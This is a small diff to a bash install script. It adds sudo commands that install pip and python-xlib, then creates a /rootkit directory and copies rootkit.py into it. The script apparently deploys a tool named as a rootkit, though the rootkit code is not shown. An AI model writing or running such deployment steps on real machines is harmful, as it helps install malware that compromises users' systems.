@@ -1,4 +1,7 @@
 #/bin/bash
+sudo apt-get install python3-pip
+sudo pip3 install python-xlib
+
 mkdir -p /rootkit
 cp rootkit.py /rootkit/rootkit.py
 
